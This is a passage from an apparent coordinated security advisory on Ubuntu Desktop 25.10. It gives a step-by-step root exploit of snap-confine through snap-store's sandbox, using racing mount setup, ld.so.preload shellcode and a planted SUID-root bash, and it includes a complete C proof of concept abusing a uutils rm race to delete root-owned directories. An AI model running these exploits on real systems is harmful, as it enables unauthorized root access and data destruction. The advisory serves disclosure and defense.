=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Case study: Ubuntu Desktop 25.10
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

    Why go fast?
    Let life run past?
        -- Tinga Tinga Tales, "Why Caterpillar is Never in a Hurry"

________________________________________________________________________

Overview
________________________________________________________________________

For Ubuntu Desktop 25.10 we must change our exploitation strategy,
because snap-confine is not SUID-root anymore; instead, it now has
capabilities attached:

------------------------------------------------------------------------
$ stat /usr/lib/snapd/snap-confine
...
Access: (0755/-rwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
...

$ getcap /usr/lib/snapd/snap-confine
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,=
cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=3Dp
------------------------------------------------------------------------

These capabilities are actually very powerful, and we can obtain them
inside a snap's sandbox by slightly revising our exploitation strategy
from Ubuntu 24.04 (by calling capset() and prctl(PR_CAP_AMBIENT_RAISE)
instead of setreuid(0)), but most of these capabilities and associated
syscalls are then denied to us by AppArmor and seccomp, thus preventing
us from gaining full root privileges outside the snap's sandbox.

Consequently, we decided to re-use the strategy that we used in our
"Lemmings" advisory to exploit the "snap-store" snap (which is installed
by default on Ubuntu Desktop): instead of racing against the "mimic"
creation of /usr/lib/x86_64-linux-gnu, we race against the "mimic"
creation of /var/lib (which is needed to bind-mount /var/lib/app-info
inside snap-store's sandbox), which allows us to control /var/lib and
hence /var/lib/snapd/mount/snap.snap-store.user-fstab, which in turn
allows us to bind-mount near-arbitrary directories and obtain a root
shell inside snap-store's sandbox, and eventually a fully privileged
root shell outside snap-store's sandbox.

________________________________________________________________________

Exploitation
________________________________________________________________________

First, we set up snap-store's sandbox by executing snap-confine with the
"core22" base, we obtain an unprivileged shell inside this sandbox, we
chdir to its /tmp directory, we frequently write to this directory (but
not to its /tmp/.snap sub-directory), and we wait for systemd-tmpfiles
to delete the unmodified /tmp/.snap directory (after 10 days, in Ubuntu
25.10).

------------------------------------------------------------------------
outside$ cat /etc/os-release
PRETTY_NAME=3D"Ubuntu 25.10"
...

outside$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)

outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
 --base core22 snap.snap-store.hook.configure /bin/bash

inside$ cd /tmp

inside$ stat ./.snap
...
Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
...

inside$ while test -d ./.snap; do touch ./; sleep 60; done
[10 days pass]

inside$ stat ./.snap
stat: cannot statx './.snap': No such file or directory
------------------------------------------------------------------------

Second, from another shell outside snap-store's sandbox, we chdir to
/tmp/snap-private-tmp/$SNAP/tmp (/tmp inside the sandbox) through the
/proc/pid/cwd of our sandboxed shell, we destroy snap-store's sandbox
(but not its /tmp directory) by executing snap-confine with an invalid
base ("snapd"), and we run our snap-store_25.10.c helper (which is also
basically CVE-2021-44731-Desktop.c from our "Lemmings" advisory):

- we re-create the ./.snap directory ourselves (/tmp/.snap inside
  snap-store's sandbox), since it was deleted by systemd-tmpfiles, and
  we create our own copy of /snap/core22/current/var/lib in
  ./.snap/var/lib.exchange;

- we force snap-confine to set up snap-store's sandbox afresh, by
  executing it with the "core22" base, but we "single-step" this
  execution (with SNAPD_DEBUG=3D1), to reliably win the race condition
  between step 1/ and step 3/ of the "mimic" creation of /var/lib;

- as soon as we see the following debug message (immediately after step
  1/ of the "mimic" creation of /var/lib),

  mount name:"/var/lib" dir:"/tmp/.snap/var/lib"

  we quickly replace snap-confine's ./.snap/var/lib with our own
  ./.snap/var/lib.exchange, whose contents are then bind-mounted into
  /var/lib (inside snap-store's sandbox); this replacement has two
  beneficial consequences for us:

  a/ we control /var/lib/snapd/mount/snap.snap-store.user-fstab, which
  allows us to bind-mount near-arbitrary directories inside snap-store's
  sandbox (these bind-mounts are not completely arbitrary, because they
  are still confined by an AppArmor profile);

  b/ various SUID-root binaries remain bind-mounted in /tmp/.snap, and
  their execution is allowed by an AppArmor rule "/tmp/** mrwlkix,"
  inside snap-store's sandbox.

------------------------------------------------------------------------
outside$ cd /proc/4078/cwd

outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
 --base snapd snap.snap-store.hook.configure /nonexistent
/user.slice/user-1001.slice/session-33.scope is not a snap cgroup

outside$ systemd-run --user --scope --unit=3Dsnap.whatever /bin/bash
Running as unit: snap.whatever.scope; invocation ID: 113af972356b4f08a58461=
cf64cc57f6

outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
 --base snapd snap.snap-store.hook.configure /nonexistent
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_GCNDEM//dev: =
No such file or directory

outside$ exit

outside$ ~/snap-store_25.10
...
hange.go:351: DEBUG: mount name:"/var/lib" dir:"/tmp/.snap/var/lib" type:""=
 opts:MS_BIND|MS_REC unparsed:"" (error: <nil>)
change.go:351: DEBUG: mount name:"tmpfs" dir:"/var/lib" type:"tmpfs" opts: =
unparsed:"mode=3D0755,uid=3D0,gid=3D0" (error: <nil>)
...
change.go:426: DEBUG: umount "/tmp/.snap/var/lib" UMOUNT_NOFOLLOW|MNT_DETAC=
H (error: invalid argument)
change.go:399: DEBUG: ignoring EINVAL from unmount, "/tmp/.snap/var/lib" is=
 not mounted
change.go:477: DEBUG: remove "/tmp/.snap/var/lib" (error: remove /tmp/.snap=
/var/lib: directory not empty)
...
/var/lib/snapd not root-owned 1001:1001
------------------------------------------------------------------------

Third, still from outside snap-store's sandbox but inside its /tmp
directory:

- we create a copy of /etc in ./.snap/etc (/tmp/.snap/etc inside the
  sandbox), we add /tmp/librootshell.so to ./.snap/etc/ld.so.preload, we
  create ./librootshell.so (/tmp/librootshell.so inside the sandbox), a
  simple shellcode that calls setreuid(0) and execve(/tmp/sh), we copy
  /usr/bin/busybox to ./sh (/tmp/sh inside the sandbox), and we add the
  following to ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab,
  which will bind-mount our copy of /etc inside snap-store's sandbox:

  /tmp/.snap/etc /etc none rbind,rw 0 0

- we also add the following line to
  ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab (and replace
  our own ./.snap/var/lib with the original ./.snap/var/lib.exchange),
  which will bind-mount the original, root-owned /var/lib/snapd inside
  snap-store's sandbox (otherwise snap-confine dies because it detects
  that /var/lib/snapd does not belong to root -- it belongs to us since
  we won the race condition against the "mimic" creation of /var/lib):

  /tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0

------------------------------------------------------------------------
outside$ cp -a /etc ./.snap
...

outside$ echo /tmp/librootshell.so > ./.snap/etc/ld.so.preload

outside$ cp ~/librootshell.so ./

outside$ cp /usr/bin/busybox ./sh

outside$ echo '/tmp/.snap/etc /etc none rbind,rw 0 0' > ./.snap/var/lib/sna=
pd/mount/snap.snap-store.user-fstab

outside$ echo '/tmp/.snap/var/lib/snapd /var/lib/snapd none rbind,rw 0 0' >=
> ./.snap/var/lib/snapd/mount/snap.snap-store.user-fstab

outside$ mv ./.snap/var/lib ./.snap/var/lib.exchange2

outside$ mv ./.snap/var/lib.exchange ./.snap/var/lib
------------------------------------------------------------------------

Fourth, we obtain a root shell inside snap-store's sandbox, by executing
snap-confine with one of the SUID-root binaries in /tmp/.snap (such as
/tmp/.snap/var/lib/snapd/hostfs/snap/core22/current/usr/bin/su), which
is dynamically linked and therefore preloads our /tmp/librootshell.so
and executes our shellcode (and hence a busybox shell) as root.

------------------------------------------------------------------------
outside$ env -i SNAP_INSTANCE_NAME=3Dsnap-store /usr/lib/snapd/snap-confine=
 --base core22 snap.snap-store.hook.configure /tmp/.snap/var/lib/snapd/host=
fs/snap/core22/current/usr/bin/su
...
BusyBox v1.37.0 (Ubuntu 1:1.37.0-4ubuntu1) built-in shell (ash)
...

inside# id
uid=3D0(root) gid=3D1001(jane) groups=3D100(users),1001(jane)
^^^^^^^^^^^

inside# cat /etc/shadow
cat: can't open '/etc/shadow': No such file or directory
------------------------------------------------------------------------

Fifth, because this root shell is still inside snap-store's sandbox,
confined by an AppArmor profile and a seccomp filter, we copy /bin/bash
to /var/snap/$SNAP/common/ and chmod it to 04755 (both operations are
allowed by the AppArmor profile and the seccomp filter), and execute
this SUID-root shell from outside snap-store's sandbox, thereby finally
gaining full root privileges.

------------------------------------------------------------------------
inside# cp /bin/bash /var/snap/snap-store/common/

inside# chmod 04755 /var/snap/snap-store/common/bash

inside# exit

outside$ /var/snap/snap-store/common/bash -p

outside# id
uid=3D1001(jane) gid=3D1001(jane) euid=3D0(root) groups=3D1001(jane),100(us=
ers)
                              ^^^^^^^^^^^^

outside# cat /etc/shadow
root:*:20368:0:99999:7:::
daemon:*:20368:0:99999:7:::
...
------------------------------------------------------------------------


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
A quick note on the uutils coreutils (the rust-coreutils)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

In August 2025, before the release of Ubuntu 25.10, the Ubuntu Security
Team proactively contacted us and kindly asked us if we were interested
in reviewing the security of the uutils coreutils (a Rust rewrite of the
standard GNU coreutils -- ls, cp, rm, cat, sort, sleep, etc), which are
since then installed by default in Ubuntu 25.10.

We were deeply interested, and honored, but unfortunately at the time we
were already working full-time on another project; so we told the Ubuntu
Security Team that we would not be able to conduct an official security
review, but that we would try to work on it anyway during our free time.

We started by carefully reading the following report, which already
contained extremely valuable information; in particular, the mention of
"unsafe, racy, tree walking algorithms" caught our attention:

  https://bugs.launchpad.net/ubuntu/+source/rust-coreutils/+bug/2111815

=46rom our work on apport (CVE-2025-5054), we then remembered that the
shell script /etc/cron.daily/apport is installed by default on Ubuntu,
is executed as root once per day, and can recursively delete entire
sub-directories of /var/crash, which is world-writable like /tmp:

------------------------------------------------------------------------
$ cat /etc/cron.daily/apport
...
find /var/crash/. ! -name . -prune -type d -regextype posix-extended -regex=
 '.*/[0-9]{12}$' \( -mtime +7 \) -exec rm -Rf -- '{}' \;

$ stat /var/crash
...
Access: (3777/drwxrwsrwt)  Uid: (    0/    root)   Gid: (    0/    root)
...
------------------------------------------------------------------------

Since rm is one of the uutils coreutils, we decided to create a
directory /var/crash/base/parent/target (as an unprivileged attacker)
and to analyze the strace of an "rm -Rf /var/crash/base" command (as
root), and we quickly discovered that rm was vulnerable to a trivial
race condition:

------------------------------------------------------------------------
  1 execve("/usr/bin/rm", ["rm", "-Rf", "/var/crash/base"], ...) =3D 0
...
147 openat(AT_FDCWD, "/var/crash/base", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIR=
ECTORY) =3D 3
...
152 openat(AT_FDCWD, "/var/crash/base/parent", O_RDONLY|O_NONBLOCK|O_CLOEXE=
C|O_DIRECTORY) =3D 4
...
158 openat(AT_FDCWD, "/var/crash/base/parent/target", O_RDONLY|O_NONBLOCK|O=
_CLOEXEC|O_DIRECTORY) =3D 5
...
163 rmdir("/var/crash/base/parent/target")  =3D 0
...
167 rmdir("/var/crash/base/parent")         =3D 0
...
171 rmdir("/var/crash/base")                =3D 0
...
174 exit_group(0)                           =3D ?
------------------------------------------------------------------------

- if, after rm calls openat() on /var/crash/base/parent (at line 152),
  but before rm calls openat() on /var/crash/base/parent/target (at line
  158), if the attacker replaces /var/crash/base/parent with a symlink
  (which will be followed by rm) to another part of the filesystem (for
  example, to /etc), then this attacker can delete arbitrary parts of
  the filesystem, as root (the shell script /etc/cron.daily/apport is
  executed as root);

- for example, if the attacker replaces "parent" with a symlink to /etc,
  and if "target" is "ppp", then rm will recursively delete the entire
  /etc/ppp directory.

We immediately reported this vulnerability to Ubuntu, who, as a
temporary mitigation in Ubuntu 25.10, replaced the default rm with a
symlink to the standard GNU coreutils' rm (i.e., in Ubuntu 25.10, rm is
a symlink to /usr/bin/gnurm, not a symlink to the uutils coreutils'
/usr/lib/cargo/bin/coreutils/rm).

To the best of our knowledge, this vulnerability in the uutils
coreutils' rm was later fixed upstream (by calling openat() relatively
to each component of a path, instead of calling openat() on absolute
paths and resolving each path component multiple times), by commits:

  https://github.com/uutils/coreutils/commit/1183529cd2deafb38bed3b6bf21235=
7b68eefa41
  https://github.com/uutils/coreutils/commit/e773c95c4e62424db17563242c35e4=
88a6d1ae9b
  https://github.com/uutils/coreutils/commit/45e6cbd109a0a33d82e90c985813ea=
83d4009714

However, at the time of writing this advisory, the uutils coreutils'
/usr/lib/cargo/bin/coreutils/rm that is shipped with Ubuntu 25.10 is
still vulnerable (but unused, since the default is the GNU coreutils'
rm); this allows us to test what would have happened if the vulnerable
rm had been shipped as the default in Ubuntu 25.10. For example, below
we run our proof of concept as an unprivileged user, and root executes
the rm command that would have been executed by /etc/cron.daily/apport,
thereby accidentally deleting the entire /etc/ppp directory:

------------------------------------------------------------------------
$ cat /etc/os-release
PRETTY_NAME=3D"Ubuntu 25.10"
...

$ id
uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)

$ cat > uutils_rm.c << "EOF"
#define _GNU_SOURCE
#include <sys/inotify.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <utime.h>

#define die() do { \
    fprintf(stderr, "died in %s: %u\n", __func__, __LINE__); \
    exit(EXIT_FAILURE); \
} while (0)

int
main(const int argc, const char * const argv[])
{
    if (argc < 3) die();
    const char * const writable_dir =3D argv[1];
    if (*writable_dir !=3D '/') die();

    const char * const parent_dir =3D strdup(argv[2]);
    if (!parent_dir) die();
    char * const last_slash =3D strrchr(parent_dir, '/');
    if (!last_slash) die();

    const char * const target_dir =3D strdup(last_slash + 1);
    if (!target_dir) die();

    last_slash[1] =3D '\0';
    if (*parent_dir !=3D '/') die();
    if (!*target_dir) die();

    unsigned long n_pre_dirs =3D 32;
    if (argc > 3) {
        if (argc !=3D 4) die();
        n_pre_dirs =3D strtoul(argv[3], NULL, 0);
    }
    if (n_pre_dirs <=3D 0) die();
    if (n_pre_dirs > (1u<<20)) die();

    if (chdir(writable_dir)) die();
    char base_dir[] =3D "XXXXXX";
    if (!mkdtemp(base_dir)) die();
    if (chdir(base_dir)) die();

    if (mkdir("parent", 0700)) die();
    if (chdir("parent")) die();
    if (mkdir(target_dir, 0700)) die();

    const char * first_dir =3D NULL;
    for (;;) {
        char try[] =3D "XXXXXX";
        if (!mkdtemp(try)) die();

        unsigned long n =3D 0;
        DIR * const dirp =3D opendir(".");
        if (!dirp) die();
        for (;;) {
            const struct dirent * const entp =3D readdir(dirp);
            if (!entp) die();
            if (*entp->d_name =3D=3D '.') continue;
            if (!strcmp(entp->d_name, target_dir)) break;
            n++;
            if (!first_dir) {
                first_dir =3D strdup(entp->d_name);
                if (!first_dir) die();
            }
        }
        if (closedir(dirp)) die();
        if (n >=3D n_pre_dirs) break;
    }
    if (!first_dir) die();

    if (chdir(first_dir)) die();
    unsigned long i;
    for (i =3D 0; i < n_pre_dirs; i++) {
        char num[256];
        snprintf(num, sizeof(num), "%lu", i);
        if (mkdir(num, 0700)) die();
    }
    const int in_fd =3D inotify_init();
    if (in_fd <=3D -1) die();
    if (inotify_add_watch(in_fd, ".", IN_ATTRIB) <=3D -1) die();

    if (chdir("..")) die();
    if (chdir("..")) die();
    if (symlink(parent_dir, "../switch")) die();
    static const struct utimbuf epoch =3D { 1, 1 };
    if (utime(".", &epoch)) die();

    fprintf(stderr, "ready\n");
    static char in_buf[sizeof(struct inotify_event) + NAME_MAX + 1];
    if (read(in_fd, in_buf, sizeof(in_buf)) < (ssize_t)sizeof(struct inotif=
y_event)) die();
    if (renameat2(AT_FDCWD, "parent", AT_FDCWD, "../switch", RENAME_EXCHANG=
E)) die();
    die();
}
EOF

$ gcc -s -o uutils_rm uutils_rm.c

$ stat /etc/ppp
...
Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
...

$ ./uutils_rm /var/crash /etc/ppp
ready
------------------------------------------------------------------------

Then, as root (to simulate the /etc/cron.daily/apport shell script):

------------------------------------------------------------------------
# id
uid=3D0(root) gid=3D0(root) groups=3D0(root)

# dpkg -S /usr/lib/cargo/bin/coreutils/rm
rust-coreutils: /usr/lib/cargo/bin/coreutils/rm

# dpkg -l rust-coreutils
...
ii  rust-coreutils 0.2.2-0ubuntu2.1 amd64        Universal coreutils utils,=
 written in Rust

# find /var/crash/. ! -name . -prune -type d \( -mtime +7 \) -exec /usr/lib=
/cargo/bin/coreutils/rm -Rf -- '{}' \;
...

# stat /etc/ppp
stat: cannot stat '/etc/ppp': No such file or directory (os error 2)
------------------------------------------------------------------------

Back in September 2025, we reported this vulnerability to Ubuntu as a
denial of service (the ability to delete arbitrary files and directories
as root), but after writing this advisory it became perfectly clear that
this vulnerability was actually powerful enough to be transformed into a
Local Privilege Escalation (LPE) to full root (for example by deleting a
/tmp/snap-private-tmp/$SNAP/tmp/.snap directory). Fortunately, this LPE
was avoided thanks to the Ubuntu Security Team, who proactively reached
out to us and mitigated it before the release of Ubuntu 25.10.


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Acknowledgments
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

We thank everyone at Canonical who worked on this release (Seth Arnold,
Zygmunt Krynicki, Nick Dyer, Eduardo Barretto, and Luci Stanescu, in
particular) and on the uutils coreutils with us (Octavio Galland, Ravi
Kant Sharma, Seth Arnold, and Julian Andres Klode, in particular). We
also thank the members of the linux-distros mailing list (Alexander
Peslyak in particular).

Finally, we dedicate this advisory to Felix Lindner:

  https://phenoelit.de/fx.html
  https://defcon.social/@thedarktangent/116157827849844661


=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
Timeline
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

2025-12-15: We sent a draft of our advisory and two proofs of concept
(firefox_24.04.c and snap-store_25.10.c) to the Ubuntu Security Team.

2026-03-12: The Ubuntu Security Team sent a patch, and we sent a draft
of our advisory, to the linux-distros mailing list.

2026-03-17: Coordinated Release Date (14:00 UTC).
